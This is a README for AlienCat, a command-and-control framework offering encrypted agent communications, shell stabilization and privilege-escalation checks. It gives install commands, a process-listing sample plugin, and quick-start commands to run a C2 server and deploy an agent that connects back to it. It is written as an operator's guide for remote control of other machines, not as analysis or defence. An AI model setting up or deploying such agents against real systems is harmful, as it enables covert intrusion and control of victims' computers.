# AlienCat C2 Framework

## Features
- 🔒 AES-256 Encrypted Communications
- 🖥️ Cross-Platform (Windows/Linux)
- ⚡ TTY Shell Stabilization
- 🔌 Modular Plugin System
- 🕵️‍♂️ Built-in Privilege Escalation Checks
- 
     .... and more ....


## Installation

```
git clone https://github.com/ediop3SquadALT/AlienCat.git
cd AlienCat
bash setup.sh
mkdir plugins
python3 aliencat.py
```

Sample Plugin
```
#!/usr/bin/env python3
import psutil

class ProcessLister:
    def __init__(self):
        self.name = "ProcessLister"
        self.description = "Lists running processes"
        
    async def execute(self, *args, **kwargs):
        try:
            return "\n".join(
                f"{p.pid} | {p.name()} | {p.username()}"
                for p in psutil.process_iter(['pid', 'name', 'username'])
            )
        except Exception as e:
            return f"Error: {str(e)}"
```
Quick Start
Start C2 Server:
```
python3 aliencat.py server --port 443 --key YourSecretKey
```

Deploy Agent:
```
python3 aliencat.py agent --connect your.server.ip --port 443 --key YourSecretKey
```

Use Plugins:
```
[aliencat]> plugin ProcessLister
```


AlienCat does not require root by default.

When You Might Need Root:
Only if binding to ports <1024 (e.g., 80, 443)

```
sudo python3 aliencat.py server --port 443  # Needs root
Otherwise, runs fine without root for:
```
Agent mode
Server on high ports (e.g., 4443, 8080)
